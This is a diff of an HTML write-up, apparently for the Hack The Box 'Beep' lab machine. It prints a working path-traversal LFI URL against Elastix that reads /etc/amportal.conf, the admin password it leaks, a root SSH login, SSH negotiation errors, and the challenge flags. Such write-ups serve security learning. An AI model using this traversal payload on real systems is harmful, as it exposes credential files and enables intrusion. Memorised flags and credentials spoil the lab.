@@ -24,18 +24,19 @@
             </ul>
 
             <h3 class="step-header">2. Exploitation</h3>
-            <p>Navigating to port 443, I found <b>Elastix</b>. Researching the version revealed a Local File Inclusion (LFI) vulnerability:</p>
+            <p>Navigating to port 443, I found <b>Elastix</b>. Researching the version revealed a <a href="https://www.exploit-db.com/exploits/37637">Local File Inclusion (LFI)</a> vulnerability:</p>
             <div class="terminal-box">https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action</div>
 
-            <p>This leaked the admin credentials: <code>admin:jEhdIekWmdjE</code></p>
-            <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250505124352.png" alt="LFI Result">
+            <p>This leaked the admin credentials:</p>
+             <fieldset class="cred-box">
+                    <legend>Credentials</legend>
+                    <code>admin:jEhdIekWmdjE</code>
+              </fieldset>
+                
+            <img src="/pngs/HTB/Easy/Beep/Pasted%20image%2020250505124352.png" alt="LFI Result">
 
             <p>Since the SSH version was quite old, I had to use specific algorithms to connect:</p>
             <div class="terminal-box">ssh -oHostKeyAlgorithms=+ssh-rsa -oKexAlgorithms=+diffie-hellman-group14-sha1 root@10.10.10.7</div>
-
-            <h3 class="step-header">3. Troubleshooting SSH</h3>
-            <p>If you encounter negotiation errors, use these flags:</p>
-            <div class="terminal-box">$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 admin@10.10.10.7</div>
 
             <fieldset>
                 <legend>User Flag</legend>
@@ -46,4 +47,15 @@
                 <legend>Root Flag</legend>
                 <code>a7399de4bbbcd6982bad73ff86884952</code>
             </fieldset>
-        </div>
+
+                <h3 class="step-header">3. Troubleshooting SSH</h3>
+
+    <div class="terminal-box">$  ssh admin@10.10.10.7
+        
+                Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1</div>
+<br>
+     <div class="terminal-box">$  ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 admin@10.10.10.7 
+         
+                Unable to negotiate with 10.10.10.7 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss</div>
+    
+</div>
